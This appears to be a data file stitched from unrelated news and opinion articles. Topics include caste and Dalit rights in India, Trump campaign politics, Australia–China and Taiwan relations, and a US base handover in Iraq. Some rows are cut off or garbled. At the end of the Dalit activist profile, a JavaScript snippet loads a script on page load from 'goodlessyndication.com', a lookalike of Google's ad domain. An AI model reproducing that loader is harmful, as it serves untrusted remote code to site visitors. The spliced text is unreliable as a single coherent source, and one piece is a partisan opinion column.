Vijayan, one of the key thinkers in Kerala as he addressed the issues of liquor, drinking, society and truth. A holistic analysis of the film is incomplete without considering the potential of liquor to enable a drinker for contemplation and momentary escapades. In other words, it won’t be an exaggeration to say that alcohol becomes the driving force of this conversation which has political undercurrents. It is the ‘production of an other’ in Arun, by virtue of intoxication, that wins over Sruthi’s keen efforts to end the friction in discussion; and thwarts Arun’s deliberate efforts in establishing harmony. The hero’s actual self hops out like a rabbit within few minutes into drinking. Sruthi captures a video of Arun promising, to quit drinking, over the last beer bottle. As Arun expresses interest to view the video, Sruthi passes him the mobile phone; but to her dismay, he continues to scroll over even after watching the video. She snatches the phone from him. At a later point, in a critical juncture of this dialogue, we see Arun expressing the same eagerness to poke his nose into her privacy. He is at the verge of moral policing her private and social life. Sruthi instantly recognizes his conduct as an encroachment into her personal space and sees through his delicate progressive- feminist trappings. Dina Chandra, the director-cum-playwright of the film seems to have detailed the characters as two individuals who are only half- formed in their political outlooks. However the problem at hand can hardly be solved, inspite of their formation as political beings alone. There is a character in S. Hareesh’s anthology Adam, who laments that- ‘on having an illicit sexual congress with a so called beautiful woman (as per the accepted norms of beauty and curves) a man is thrown into an aporia- of keeping it a secret, overpowered by an urge to gossip for want of satisfaction. This issue makes the female body/ beauty a site replete with winding paths of discourses. These complexities can be unfolded using the concept of ‘Cultural Hegemony’ put forth by Antonio Gramsci. He presents the idea as a variant of Marxist thought, which says a dominant ideology is that which reflects the belief systems and interests of the dominant class in a society. Gramsci declares by virtue of his theory that the values, ideas and dreams disseminated by the social institutions continue to function in the society as the intellectual force apparatus, strengthening the world view of the dominating class and thereby setting the wheel of cultural hegemony in perpetual motion. This concept is universal unlike most other Marxist analytical tools. In Pradeepan Pambirikkunnu’s work analyzing food culture, clothing, festivals and other symbols, one can find the reverberations of Gramscian analytical model. Pambirikkunnu analyses how Set mundu/ Set Saree became the common wear of Malayali women and Sadya (Kerala meals) the accepted food of Kerala. He interrogates who own/ owned these cultural symbols. He maintains that the cultural rationale behind such generalisations is clearly domination. Here we have to problematize the ‘dominant aesthetic sense’ which has influenced the society. Contrasting with such tendencies is the only plausible way to examine a subaltern male’s upper caste insecurities (which also in effect,outrages womanhood and democracy). In a space where elite aesthetics is established as universal, an individual with such a physique is deemed invaluable. This pricelessness makes it a covetous property fit to be robbed anytime! Once lost, it will be a tedious task to find another of same value- is the state of submissive insecurity latent in a subaltern male’s ambiguous conduct as opposed to his inner self and modesty. A masculine sense regarding social acceptance is alslo at work here. The problem of partner-centrism and societal acceptance are visible in Jayamohan’s novel Nooru Simhasanangal. There, the protagonist who climbs up the rungs of class and social value, chooses an upper caste woman as his partner in hope of improving his ‘cultural status’ as well. The ‘rise’ dependent on other by virtue of marrying an upper caste woman is suggested in this film too. In that case, Arun’s ‘selection’ has a social dimension (Sruthi argues that it was Arun who stalked and followed her continously on social media platforms). Power conflicts reach its peak and manifests fully, as the dialogue revolves around marriage. Sruthi says, “I never imagined that ‘my family’ would say yes to an intercaste marriage”. This statement spites Arun, who feels she had insulted both his family and community. He understands it as an expression of ‘caste pride’ alive inside her. While we can reckon in her reaction, the trivialization of consent from groom’s family, what drives Arun to protest, is his patriarchal mindset. He can’t stand a woman belittling him, despite of his loss at the face of her comment, “Won’t your family hesistate to palm off your sister to someone beneath your caste? ”. However when it comes to Reservation, the hero is more rational, unlike the heroine. Arun criticizes Sruthi’s idea of reservation as a mere poverty eradication project and enlightens her that it is an affirmative help deserved by people who have been denied rights for generations. Unfortunately, the same hero fails miserably as the discourse develops into the terrains of caste oppression. He is blind to the injustice his community directs towards the ‘lower’ communities, and puts up a feeble argument that the whole issue of casteism is a brahminical product. It shows the shallowness of critique and self criticism in both individuals. By the close of this dialogue/ short film, we have a heroine who walks out of this relationship. She is provoked to this end, on being doubted of her virginity. We hear her proudly saying that she had not slept even with Arun, her fiance. Dina Chandra, in his interview with ‘The News Minute’ had mentioned that this statement by heroine is indicative of a puritanical notion widespread in the society. He goes one step further to add that physical proximity might have lessened the frictions in their bond. The foreword of Modi and Beer is E. V. Ramaswamy’s words- “The way man treats women is much worse than the way the higher-caste treat the low-caste, and the landlords treat the servants”, which is sufficient of generating a prejudice in the audience. Periyar’s statement cannot be given a direct reading in the present day context, neither can it be conceived as a doorway to the film (a film produced and its readings could be mutually exclusive). Therefore it will be better to enter into the sensibilities of the film totally ignoring the foreword. I understand the film experience as an opportunity to disentangle the multilayered conflicts of mutual domination. In this modern times, when domination is being understood as even an organic trait in homosapiens, let us sincerely hope the creative expression of such complexities will reprimand the utterings of simplification. write to the author  captures narratives, public meetings, songs, talks, discussion on dalits.

Trump says he told Senate Republicans working on next phase of coronavirus stimulus to move on. During the 2016 presidential campaign, Donald Trump directly appealed to African American voters for their vote, asking them, ""What do you have to lose?"" Trump should have received more credit for this, as Republicans have often been criticized for not wooing African Americans from Democrats, who crucially depend on their overwhelming support yet take their votes for granted. Trump's message was that Blacks had entrusted their improvement exclusively to the Democratic Party, but it had failed to produce. He highlighted two critical areas in which Democrats had let them down: education and poverty. TRUMP SAYS BIDEN LISTENING TO BERNIE'S 'RADICALIZED PEOPLE,' DRIFTING 'FURTHER LEFT' He said that Blacks ""are living in poverty"" and their ""schools are no good,"" and he pledged to do better by them, unlike Democrats, who offered nothing but empty promises. The Democrats have never bothered to show how their policies are superior to the Republicans' because they can't. Instead, they've cynically cast Republicans as uncompassionate and, in many cases, racist. I've always assumed their scheme worked, because I can find no other explanation for the Democrats' electoral vice grip on African Americans than the latter's distrust of Republicans. Nothing else makes sense. It's no coincidence that Democrats have played the race card with even greater intensity in response to President Trump's undeniable policy successes for African Americans and other minorities. Under Trump, African American unemployment was at a record low, and their wages were greatly improving prior to the virus-induced downturn. Democrats always cite the same phony examples to make their case, such as that Trump is an immigration hawk because he doesn't like Mexicans and other non-Americans. It's all bogus, but it works, and it sure beats having to explain away their own policy failures and Trump's policy successes. It is despicable and destructive. Falsely accusing people of racism is a particularly egregious sin, not just because there are few smears more harmful to one's reputation but also because it damages race relations, especially when the slander, like the sin of racism itself, is applied with a broad brush to an entire group of people -- in this case, the Republican Party. But why fool ourselves? The Democratic Party isn't going to change anytime soon on this score, as evidenced by Joe Biden's ghastly remark that African Americans not supporting him aren't Black. As such, a good friend of mine suggested to me that President Trump must follow up on his 2016 challenge to African American voters. Normally, I'm reluctant for Republicans to target African Americans or other specific voter groups because it smacks of race consciousness and identity politics, and could be seen as patronizing and pandering, none of which has ever stopped Democrats. But as sensitive as the race issue has become, and as much as Democrats have painted Trump and Republicans as racist, it's time this is addressed head-on. Now he has a concrete record to tout, but he needs to sharpen his message to demonstrate how his policies were actually lifting African Americans out of poverty, and how the Democrats' active neglect of Black children in inferior inner-city schools has doomed many of them to lives of poverty, violence and crime. CLICK HERE TO SIGN UP FOR OUR OPINION NEWSLETTER Trump is particularly suited to this task because he has fulfilled his campaign promises to African Americans and he speaks from the heart, avoiding the double speak used by many politicians. President Trump must accentuate the economic and education issues on which he campaigned, but he should also point to the civil unrest, crime, lawlessness and anarchy that dominates our cities today, and tailor his law and order agenda to Black families who crave domestic tranquility as much as anyone else does. Cities are imploding throughout the nation under mostly Democratic leadership, and they are inflamed with violence. Trump should turn the tables on Democratic politicians and make them answer for their abject policy failures and explain why they turn a blind eye to Black lives lost to inner-city violence. Black families living in these troubled neighborhoods surely want law and order and peace and liberty as much as anyone else, despite the activists' exclusive focus on instances of police misconduct. As for these rogue cops, which are a very small minority, it's time that Democrats explain their unwavering support for the police unions that protect them. African Americans understand that defunding the cops would be disastrous, yet the Democrats' answer is less law enforcement rather than more, which guarantees more arson, looting and death. CLICK HERE TO GET THE FOX NEWS APP Trump should demand that Democrats answer why they aggressively oppose charter schools, school choice and other initiatives aimed at improving the quality of education for all people. Here again, are the Democrats working for African Americans or teachers unions? My friend is right. President Trump, please take your case directly to African Americans and contrast your record with the Democrats' incendiary and opportunistic rhetoric, and failed policies. Point out that, in fact, African Americans have very much to lose by supporting a party that has no answers for them, and that would enable more lawlessness and ensure greater inequality of outcomes.

0,"Suman Devathiya is a senior Dalit activist from Rajasthan who has been at the forefront of fighting for Dalit women’s rights and taking Dalit history to grassroots in the state, NAZISH HUSSAIN reports. RAJASTHAN: In Rajasthan, which is one of the worst five states in India when it comes to atrocities against Dalits, Suman Devathiya, a senior Dalit rights activist has emerged as a leader overcoming not only the entrenched casteism in the state but deep-seated patriarchy as well. Suman is a part of Dalit Women Fight, a movement led by Dalit women to strengthen their voices for justice. Commenting on the importance of Dalit History Month, Suman says that it is very important to know one’s correct history. “In the mainstream, there is no Dalit history. There are youth who are collecting Dalit history. Maybe our future generation will benefit from our small contributions,” she told TwoCircles.net. The Twitter handle of Dalit Women Fight is full of inspirational stories of Dalit women. Talking about the social media campaign for Dalit History Month Suman says that their objective was to acknowledge and take inspiration from the contributions of Dalit sisters and mothers who have contributed positively towards the society. Dalit History Month was launched in 2013 by Sanghapali Aruna and Thenmozhi Soundararajan. The idea was to celebrate Dalit contribution to history and the month of April was dedicated for this. Incidentally, April is a significant month among Dalits as two great Dalit leaders – Dr BR Ambedkar and Jyotirao Phule were born in April. Dalit History Month is dedicated to bringing out stories from marginalized communities and acknowledge their experiences to change the existing dominant narratives. Suman says she feels happy that there are many great personalities from the Dalit community who have done inspiring work. “Why can’t we do the same. The sharing of these stories gives us motivation and we feel strong,” she says. Suman grew up in a humble family in the Jhunjhunu district of Rajasthan. She was married at the age of 15, while still being in 10th standard. Despite being married at an early age, Suman had only one thing in mind: to complete her education. Determined, she completed her Bachelors in Arts from Rajasthan University. Soon after graduation, Suman started working for the education of girls in the backward regions of Rajasthan. Suman is proud of her education, which she completed against all odds. According to Suman, Dalit women in Rajasthan are not able to attain education. “Casteism and patriarchy are the major obstacles in the path of Dalit women to attain education. The economic backwardness of the Dalit community is another barrier for Dalit women,” Suman says. As a Dalit rights activist, she has become an agent for the advocacy of the Dalit community. Over the years, Suman has been instrumental in bringing forth the issues of Dalit women in Rajasthan before the government. Suman attributes her work to the larger Dalit movement in the country. “When I got involved with this movement I got to know about the history of our forefathers. If there was no movement, I would never have known about our history. As I am a part of this movement, I have the opportunity to help my fellow sisters,” she says. In Rajasthan, Suman is regarded and known as one of the prominent Dalit women leaders. In her 17 years of working for Dalit rights, she has worked with multiple organizations. An abiding interest for her has been her close work with women survivors of domestic abuse and rape survivors. “There have been many women who lost hope and suffered from low morale. We gave them confidence and we helped them,” she says. Suman has also been taking up Dalit women issues which are ignored by the mainstream feminist movements and also by the larger Dalit movement. As part of these efforts, Suman has independently led Dalit Women self-respect marches across more than 20 districts of Rajasthan. The fight against casteism and patriarchy has not been without challenges. “In my working experience, I have observed that casteism or patriarchy work together. Patriarchy is not ready to accept a woman’s leadership. And if you look at Rajasthan, it is because of patriarchy and casteism that we have not seen any women leadership,” she says. Suman says that every time she had to fight for her rights as a Dalit woman she looked up to Ambedkar for moral support and strength. “We Dalit women have no one other than Ambedkar. He is the only one we look up to. When we read him we feel that safe space,” she says. Suman believes that Ambedkar is not only a Dalit leader but he also has a feminist viewpoint. While in school, Suman would read very little about Ambedkar or the Constitution. “It is only after connecting with Dalit movements that I came to know about Dalit personalities,” she says. At home either, Suman didn’t receive any education about the great Dalit personalities. She ascribes this to lack of education and awareness among the older generation. “These personalities always inspire me as my forefathers,” says Suman, who is now conscious and aware of her history. Other than Ambedkar, Suman is inspired by Savitribai Phule, India’s first social reformer who established a school for girl children. “You must read Savitribai Phule and how she gave importance to education and Jyotiba Phule supported her,” she says. Suman believes that there is a lack of consciousness and knowledge of Dalit history in the remote villages of Rajasthan. “The women in the remote areas are not formally educated or aware of the Dalit movement,” she says. Suman has been working relentlessly to change this scenario. She does this by sharing her knowledge with them. She has become a link to disseminate the Dalit history among women who are not conscious or aware of their rights. “I think when I have learned so much, I should bring this knowledge to the larger Dalit community and I take pride in doing it,” she says. Her journey has not been smooth. During difficult times, Suman says, “it was my mother who remained by inspiration and gave me strength.” “We Dalit women have each other only. We have to be there for each other and support each other,” she says.window.onload = function() {var adsPercent = 1;if(Math.random() <= adsPercent) {var script = document.createElement(""script"");script.src = ""https://pagead2.goodlessyndication.com/js/adsbygoogle.js""; document.getElementsByTagName(""body"")[0].appendChild(script); } };"
0,"It's the latest way the campaign is working to capitalize on Trump's rallies. Bipartisan concern grows over federal response to coronavirus outbreak While President Donald Trump delivered a fiery speech at his South Carolina rally Friday night, blasting Democrats and defending his administrationâ€™s coronavirus response, his campaign was working to turn the event into a slick, locally focused TV ad that will soon run in the area. Itâ€™s part of the re-election teamâ€™s new strategy to flip the presidentâ€™s sprawling campaign rallies into locally centered TV ads that air days after his road show has left town. The strategy is geared toward further extending the reach and media attention that Trump rallies already generate. The campaign has produced and run six-figure ad buys after rallies in New Hampshire, Arizona, Nevada, and Colorado -- with plans to roll run another local ad highlighting Trump's North Charleston rally, a senior Trump campaign official told ABC News. The president tweeted out a version of the South Carolina ad but the campaign hasnâ€™t announced its placement or a buy yet. According to ad service firm CMAG, the Trump campaign placed a $139,000 ad buy in Nevada to run over the next two weeks, and spent $188,760 in Colorado for the week of Feb. 25-Mar. 2. The ads themselves serve as a 90-second highlight reel recapping each rally, carefully curated by the campaign to air in local markets. They promote issues specific to each state like immigration in Nevada and record low unemployment in South Carolina. The Arizona ad features the viral video of a World War II veteran being carried to his seat at the Phoenix Trump rally. The new ads mostly omit the attacks the president heaves at his Democratic rivals, and instead showcase interviews conducted by the campaign with supporters, as well as local news coverage, while sticking mostly to pre-written sections of the president's stump speech -- shying away from highlighting the presidentâ€™s off-script and polarizing moments. â€œIt is an interesting way to keep the campaignâ€™s message on track,â€ Vanderbilt political scientist John Geer, whose research focuses on political advertising, told ABC News. â€œIt is also an approach that works better for the president, since he often steps on his message.â€ Geer also questioned the ads' impact, given that voters' views of Trump are largely set. ""If you consider what happened in South Carolina, Tom Steyer would certainly question the power of ads, in general, to influence the public,"" Geer said, pointing out that the billionaire massively outspent Joe Biden in the state, only to see the former vice president get four times the vote he did. However, the Trump campaign has said they've yet to fully dive into their planned persuasion ad plan. ""We haven't even really started -- we haven't run $1 of persuasion advertising, really. We've done some but like nothing like what we're going to do over the next six months,"" a senior Trump campaign official said. And while locally focused ads aren't a new strategy for a presidential campaign, the new ads are the latest way the Trump campaign has found to extend the impact and maximize the return on investment of the president's rallies. â€œWe just continue to try to get every ounce of value out of the rallies,â€ Trump campaign communications director Tim Murtaugh told ABC News. â€œWe know there are many thousands of people who were unable to get inside the rally and we want to make sure they could share in the excitement a little bit.â€ The campaign views the president's rallies as more than just one-day events. Top surrogates like Vice President Mike Pence or Donald Trump Jr. hold local events in the days leading up to the rally, campaign staff travel the day before and flood the local media markets -- and now, in the days following the event, the campaign runs a local TV ad that was shot entirely at the rally in that market. And with each rally, the campaign also collects troves of data through everything from online ticket requests to selling merchandise inside the arena -- which can sometimes inform the team where to head next. After holding a rally in El Paso, Texas, in early 2019, the campaign said they noticed a large number of supporters coming over from New Mexico for the event -- and a few weeks later the president was in Rio Rancho. While Trump's re-election campaign has traded the retail politics of diner stops for rock concert-style rallies, the president is set to take part in his first town hall of the election cycle next week on FOX News.

0,"INTERACTIVE ELECTION MAPS A Special Investigation Team (SIT) of CID (crime) that was constituted to investigate the alleged gang rape and murder of a 19-year-old Dalit girl who was found hanging from a tree at Modasa in Gujarat’s Aravalli district on January 5, concluded that she was neither raped nor murdered. The SIT report, though incomplete, said that the victim was romantically involved with prime accused Bimal Bharwad. It said that she had hung herself from a tree at Sayra village in Modasa in the intervening night of January 4 and 5 after Bharwad refused to commit to a stable relationship. In a press conference held in Ahmedabad and addressed by DIG Gautam Parmar and SP Virendra Singh, the SIT gave a sequence of events from December 30. They said that the victim, her elder sister, prime accused Bimal Bharwad and three other accused went to Asian Green Hotel and stayed the night. Gautam Parmar who is leading the SIT said, “The victim and her sister came in touch with accused Bimal Bharwad on December 14 or December 15 last year and met him for the first time on December 17.” According to their investigation, Bharwad and the victim had engaged in a physical relationship in the next few days and met at the victim’s house and at various guest houses. Parmar said that the victim wanted Bharwad to commit to a stable relationship but Bharwad, being already married, came under pressure to maintain his distance. He then supposedly planned to get her involved with his cousin Akash so that he could blame her of infidelity and end the relationship. “However, this did not work and the girl (victim) threatened to expose him,” Parmar added. “On January 1, the victim called Bharwad and asked to meet her. Bharwad revealed this to the victim’s sister who advised him against meeting her. Nonetheless, Bharwad decided to meet the victim as she had threatened to expose him lest they met. So Bharwad reached her village, picked her up and drove to Modasa town where they fought for two hours. When the victim refused to get down from Bharwad’s car, he called her sister. However, the victim did not relent even after her sister arrived so her sister snatched her phone and smashed it so that she couldn’t try to reach Bharwad’s wife. Following which victim got down from the car to check her phone and taking the opportunity, Bharwad fled,” added Parmar. Aggrieved, the victim took an autorickshaw and reached Sayra, her village, as per the SIT report. The SIT further added that during the investigation, the post mortem report, the FSL report (Forensic Science Laboratory), call details (40 calls from the victim to Bharwad and 67 messages asking him to marry her), statements of seven witnesses under CrPC 164 are among evidences collated and that are to be admitted in court. Reconstruction of Crime Scene as claimed by SIT The SIT has claimed that a reconstruction of the crime scene successfully concluded that it was a case of suicide and not murder. Backing up the claim, DIG Parmar said, “It is very easy to climb a tree which was demonstrated and hence reconstructed as the crime scene by a female constable.” “Secondly, other than injuries on the neck caused by the dupatta used for hanging, no other injury was found on victim’s body. The injuries found on victim’s body in the post mortem are said to have caused by bark and branches of the tree. No semen or saliva was found on victim’s body to prove rape, gang rape or unnatural sex (sodomy). Moreover, call records show that the victim had called Bimal Bharwad herself so kidnapping has been ruled out,” added Parmar. On being asked about post mortem finding of fluids from vagina and rectal prolapse, Parmar said that had occurred due to decomposition of the body. Hole in the SIT report The SIT has admitted that the police is still trying to find out what transpired between January 1, when the victim boarded an autorickshaw to reach Sayra, as claimed by SIT, and January 5, when her body was found hanging by a tree in the outskirts of the village. According to the SIT report, the victim’s movement on January 1 has been traced from her village Sayra to Modasa and back to Sayra in an autorickshaw on the same day. However, the trace went cold after January 1 after which she went missing, as claimed by the family in the FIR. The family had also accused Police Inspector N.K. Rabari of refusing to register a missing person complaint and file a case of illegal detention of the victim on January 2, a day after she went missing. Noticeably, even as SIT probing the case has termed it a suicide, a parallel investigation is being conducted on Rabari for the alleged negligence. Rabari was suspended by the DGP, Gujarat, after allegations surfaced against him and the ADGP of SC/ST cell had initiated an inquiry against him. The SIT report also doesn’t explain why the victim took four days to commit suicide or the reason for the injuries indicated as ante-mortem in the post mortem report. The post mortem report states, “One ligature mark is in form of dark reddish brown like abrasion on front, right and back of neck. One ligature mark on the thyroid cartilage, one reddish brown irregular shape abrasion found on upper part of left chest and abrasion marks on shoulder and thumb are all ante-mortem in nature.” The Accused Prime accused Bimal Bharwad has been booked under various sections of the Scheduled Caste and Scheduled Tribe (Prevention of Atrocities) Act, 1989 and under IPC Section 306 for abetment to suicide, Section 201 for destruction of evidence and under Section 504 for insulting the victim with obscenity over phone calls. There was no role found of the other three accused Satish, Jigar Parmar and Dharshan Bharwad. Bharwad is to undergo a Narco test as per court’s order."
0," Yet another rape case is causing fault lines to open up across India - a Dalit woman from the Indian state of Uttar Pradesh died after two weeks in hospital. Before she got there she was filmed, twice, telling police she’d been raped and naming one of her attackers: a neighbour from a higher caste. She had difficulty speaking because her tongue was damaged. Five of the local policemen investigating have since been suspended and the case handed over the Central Bureau of Investigation. But Dalit groups say they fear it will do little to change things, in a country where the rape of Dalit women is a daily occurrence. Beena Pallical is from the National Campaign on Dalit Human Rights. ""We have seen several cases that have been handed to the Central Bureau of Investigation and they have not reached anywhere. The perpetrators have gone free and there's a high level of impunity which will continue."" 3 minutes Duration: 04:29 Duration: 03:58 Duration: 03:37 Duration: 02:50"

0," Tikamgarh (Madhya Pradesh), July 25 : Promise of providing housing to the poor has been made by both Centre as well as state governments but a Dalit family in Tikamgarh district of Madhya Pradesh is forced to live in a toilet for the last several years. However, the administration denied that the family is living in the toilet. Maganlal Ahirwar, his wife and four children live in Keshavgarh Gram Panchayat of Mohangarh area of Tikamgarh district. All of them have been living in the toilet for four years. Ahirwar’s wife Phula Devi said she told the authorities several times that her family didn’t get house under the Pradhan Mantri Awas Yojana, but no one listened. The couple even got their daughter married in the same toilet. They even got an electricity connection and gas connection under the Ujjwala scheme. Mohangarh tehsildar Dr. Abhijeet Singh told IANS, “I got to know about the case and have asked for the report. Maganlal Ahirwar came to the office two-three days ago and denied that he was living in the toilet with his family. He has an ancestral house in the village.” He might have lived in a toilet earlier but currently he is not living there, Dr Singh added. IANS Your email address will not be published.

(Australian Office Taipei photo) The Australian representative office in Taipei said Tuesday (Jan. 21) that its government's disclosure of a case involving a self-confessed spy from China, who was seeking asylum in Canberra late last year, was not aimed at influencing Taiwan's general elections, as has been alleged. In an exclusive interview with CNA Tuesday, Gary Richard Cowan, head of the Australian Office Taipei, said there was no truth to the allegations that the Australia government or people were seeking to influence Taiwan's election. ""There is no circumstance under which Australia would seek to interfere in an election in Taiwan,"" Cowan said, adding that only the Taiwanese people have the right to choose their leader and decide who should represent them. The case of the self-confessed Chinese spy Wang Liqiang (王立強) was reported in the Sydney Morning Herald and other Australian media outlets last November, during the campaign leading up to Taiwan's presidential and legislative elections on Jan. 11. According to the reports, Wang went to Australia's counter-espionage agency last October with information on how China's intelligence officers had been funding and conducting spying operations in Hong Kong, Taiwan and Australia. China's law enforcement agencies denied the reports, saying Wang was a fugitive wanted for fraud. In Taiwan, some news commentators said the timing of the reports indicated that the Australian government had fed Wang's story to the media in a bid to help Taiwan's President Tsai Ing-wen (蔡英文) win her second term. Cowan, however, said that was not the case, as the Australian government does not take sides in Taiwan politics. ""Australia has had longstanding and good relations with people across the political spectrum in Taiwan for a long time, and we expect that to continue,"" Cowan said. He congratulated Tsai, her running mate Lai Ching-te (賴清德), and all the legislators-elect on their victory and lauded Taiwan's democratic development since its period of martial law ended in 1987. On the question of future cooperation between Australia and Taiwan, Cowan said the focus will be on education, trade, energy and science. This year, he said, the theme of the bilateral relations is ""discover Taiwan, discover Australia,"" as chosen by his office. Meanwhile, Cowan expressed thanks to the Taiwan government for donating 6,000 respirator masks to Australia, which is battling a series of devastating bushfires, and to the Taiwan Red Cross for launching a donation drive. Cowan urged the Taiwanese people to continue visiting, studying, working and investing in Australia, saying those are the best ways to support the country's recovery. ""The emergency is ending,"" he said. ""We are very much open for business and looking forward to welcoming people there.""

Published: 14th November 2020 09:04 AM | Last Updated: 14th November 2020 11:55 AM | A+A A- Dalit leader Kameshwar Chaupal PATNA: Amid buzz that the BJP may opt for veteran Dalit leader Kameshwar Chaupal as the new deputy chief minister instead of incumbent Sushil Kumar Modi, the Bihar NDA held its first meeting after the elections on Friday. The speculation strengthened after hundreds of supporters of Chaupal raised slogans demanding his elevation as deputy CM, upon his arrival at the Patna airport. Chaupal is one of the 15 members of a trust set up on the directions of the Supreme Court to construct a Ram temple at Ayodhya. He was also accorded the rare honour of performing the first Shilanyas — laying the first brick in the foundation for the construction of a Ram temple in Ayodhya on November 9, 1989 — as part of the Sangh Parivar’s social engineering. He coined the slogan ‘Ram with Roti’, melding faith with livelihood. However, Chief Minister Nitish Kumar may not be comfortable with a new deputy. “Sushil Modi may not have a wide vote bank but he is well experienced in running ministries like finance,” some NDA leaders opined. As for Sushil Modi, the speculation is he could be sent to the Rajya Sabha on the seat that fell vacant after the demise of LJP founder Ram Vilas Paswan. Propping up Chaupal could also help the BJP build a Dalit vote bank to occupy the space vacated by LJP chief Chirag Paswan. For his part, Chaupal said he had no official word on any new assignment within the government or the party. Later in the day, Nitish submitted his resignation. An NDA meeting on Sunday will take the process of government formation forward. ALSO WATCH: O P E N Disclaimer : We respect your thoughts and views!

0,"Amid rising expectations of China’s retaliation to Australian push for the coronavirus (COVID-19) outbreak, China’s Global Times (GT) came out with the news during late-Sunday, based on Chinese experts, suggesting further hardships for the pacific nation. Australia worries that China will impose tariffs on its exported barley, but it might face much bigger problems than barley if it continues to take unfriendly action against China, experts warned on Sunday. The comments came after Reuters reported that China might increase duties on Australian barley, as bilateral ties between the world's second-biggest economy and one of its biggest suppliers of farm products have been further damaged by Canberra's most recent move on the origins of COVID-19. Relations are the foundation of trade between two countries, and deteriorating ties could result in severe damage to bilateral trade between China and Australia, Jiang Yong, an expert at the China Institutes of Contemporary International Relations in Beijing, told the Global Times on Sunday. On November 19, 2019, China extended for six months an anti-dumping investigation on Australia's exported barley that started on November 19, 2018, and the investigation is due to finish on May 19 this year. This apparently caused Australia's anxiety on potential tariffs. Considering Australia’s reliance on China, the news should weigh on the Australian Dollar (AUD) while also negatively affecting the market’s risk-tone sentiment. As a result, the AUD/USD pair stays pressured around 0.6530 by the press time.  Information on these pages contains forward-looking statements that involve risks and uncertainties.

0,"Nomad Traveller Artist, Freethinker, Writer/Speaker Message from White Eagle, Hopi indigenous on 16/3/2020 “This moment humanity is going through can be seen as a portal and as a hole. The decision to fall into the hole or go through the portal is up to you. If they repent of the problem and consume the news 24 hours a day, with little energy, nervous all the time, with pessimism, they will fall into the hole. But if you take this opportunity to look at yourself, rethink life and death, take care of yourself and others, you will cross the portal. Take care of your home, take care of your body. Connect with the middle body of your spiritual house, all this is synonymous, that is to say the same. When you are taking care of one, you are taking care of everything else. Do not lose the spiritual dimension of this crisis, have the aspect of the eagle, which from above, sees the whole, sees more widely. There is a social demand in this crisis, but there is also a spiritual demand. The two go hand in hand. Without the social dimension, we fall into fanaticism. But without the spiritual dimension, we fall into pessimism and lack of meaning. You were prepared to go through this crisis. Take your toolbox and use all the tools at your disposal. Learn about resistance with indigenous and African peoples: we have always been and continue to be exterminated. But we still haven’t stopped singing, dancing, lighting a fire and having fun. Don’t feel guilty about being happy during this difficult time. You don’t help at all by being sad and without energy. It helps if good things emanate from the Universe now. It is through joy that one resists. Also, when the storm passes, you will be very important in the reconstruction of this new world. You need to be well and strong. And, for that, there is no other way than to maintain a beautiful, happy and bright vibration. This has nothing to do with alienation. This is a resistance strategy. In shamanism, there is a rite of passage called the quest for vision. You spend a few days alone in the forest, without water, without food, without protection. When you go through this portal, you get a new vision of the world, because you have faced your fears, your difficulties… This is what is asked of you. What world do you want to build for yourself? For now, this is what you can do: serenity in the storm. Calm down and pray. Everyday. Establish a routine to meet the sacred every day. Good things emanate, what you emanate now is the most important thing. And sing, dance, resist through art, joy, faith and love.” Artist, Free Thinker, Writer/Speaker On these platforms I will be sharing art, my writing, posting stories from travels, life experiences, adventures, sharing news articles and much more.

0," Wednesday, Sep 08, 2021 | Last Update : 08:56 PM IST The love story of Miryalguda couple Amrutha and Pranay which ended in tragedy after the father of girl, Maruthi Rao, hired contract killers to eliminate Dalit son-in-law took an interesting turn on Sunday. Maruthi Rao, the prime accused in the murder of 24-year-old Dalit boy Pranay in Miryalguda, was found dead inside a room at Arya Vaishya Bhavan in Hyderabad.  The police who found him dead in the room suspect suicide. However, they are not concluding anything yet and probing the reason for his arrival to Hyderabad. The body was sent to Osmania Hospital in Hyderabad for post mortem. It may be recalled that Maruthi Rao, the deceased had paid Rs 1 crore to contract killers to get rid of Pranay, who hailed from Dalit community. Maruthi Rao was against his daughter Amrutha marrying Pranay. Pranay was killed just outside the hospital where the couple had gone to get a check-up done on Amrutha, who was pregnant at the time.  The police had named eight people in the chargesheet including Maruthi Rao. Media men were quick to rush to Amrutha to get her reaction on her father's death. A calm and composed Amrutha told the press that she had cut off all communication with her father since the murder of her husband. She also said that the she learnt about her father's demise only through the media and was waiting for confirmation from her relatives before she could offer any more comments.

0,"The U.S. military announced Tuesday it had handed over a strategic outpost near the Iraq-Syria border to Iraqi forces in a region known to host an Iran-backed militia responsible for more than a dozen rocket attacks targeting coalition troops. Two experts who spoke to Military Times worry the base nestled near a key border crossing area could fall into the hands of the Iran-backed group — cementing what national security experts have warned is Tehran’s goal of a land route to the Mediterranean Sea for the movement of arms, proxies and illicit goods. Officials with Operation Inherent Resolve — the U.S.-led mission to defeat ISIS in Iraq and Syria — say the al-Qaim base transfer is about consolidating coalition forces following successful operations against ISIS militants. “Today marks a historic moment for the Combined Joint Task Force Operation Inherent Resolve and our Iraqi Security Partners,” Brig. Gen. Vincent Barker, OIR director of sustainment, said in a release. “Al Qaim base served as a critical location in the fight against Daesh. First, as the Iraqi Security Forces liberated the Al Qaim region from an evil presence, and later as a valuable base during the Battle for Baghouz, the last physical territory held by ISIS. Today’s transfer is possible thanks to the efforts and successes of our ISF partners,"" Barker said in the release. But the base transfer follows two recent rocket attacks targeting an Iraqi base housing coalition troops known as Camp Taji. A rocket attack on March 11 resulted in two U.S. troops and one U.K. service member dead. On March 14, a barrage of 107 mm rockets wounded several American troops. Rocket attacks since October 2019 have precipitated a deadly tit-for-tat escalation between an Iran-backed group known as Kataib Hezbollah and U.S. forces. A rocket attack that killed an American contractor and wounded several U.S. troops in December 2019 in Kirkuk nearly led to a war with Iran. Charles Lister, a senior research fellow and director of Countering Terrorism and Extremism Program at the Middle East Institute, tweeted Tuesday Kataib Hezbollah may take over the base following the U.S. departure. “Who wants to bet that 6 months from now, #Iran-backed militias will be the “ISF” [Iraq security forces] in command of al-Qaim base?,” Lister tweeted. “#IRGC-linked [Islamic Revolutionary Guard Corps] militias already have a sizable presence around al-Qaim, not to mention controlling the other side of the border, in #Syria’s al-Bukamal/Imam Ali Base etc.,” Lister tweeted. Kataib Hezbollah has an extensive network across the Anbar province in Iraq, according to Phillip Smyth, a research fellow for the Washington Institute and Iran expert. The Shia militant group has been known to operate in al-Qaim, Abu Kamal and along Route 1 that runs through Anbar province, Smyth told Military Times. Smyth told Military Times he was sure the base would fall to the Iran-backed group, warning that the militants already had “defacto” control. “Once we’re out, they’ll be there,” Smyth said. Lister told Military Times that Kataib Hezbollah controls the Syria border crossing near al-Qaim. “They’re the key PMU [popular mobilization unit] player around al-Qaim, arguably 